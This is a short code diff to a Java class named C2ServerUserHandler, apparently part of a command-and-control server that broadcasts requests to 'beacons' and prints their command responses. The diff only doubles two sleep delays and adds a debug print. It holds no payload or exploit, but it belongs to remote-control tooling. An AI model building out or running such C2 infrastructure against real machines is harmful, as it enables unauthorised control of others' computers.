@@ -320,7 +320,7 @@ public class C2ServerUserHandler implements Runnable{
 
                         // Give the client a moment to run the command and return tne responses
                         try{
-                            Thread.sleep(1000);
+                            Thread.sleep(2000);
                         } catch(InterruptedException e){
                             e.printStackTrace();
                         }
@@ -328,7 +328,7 @@ public class C2ServerUserHandler implements Runnable{
                         C2server.broadcastToBeacons("Request " + clientIP + "_ ");
                         
                         try{
-                            Thread.sleep(1000);
+                            Thread.sleep(2000);
                         } catch(InterruptedException e){
                             e.printStackTrace();
                         }
@@ -347,6 +347,7 @@ public class C2ServerUserHandler implements Runnable{
                         // Iterate through responses and print only ones that are new
                         for(Object message : messages){
                             if(readMessages.contains(message.toString())){
+                                System.out.println("Removing Object");
                                 readMessages.remove(message.toString());
                             } else {
                                 System.out.println(message.toString());
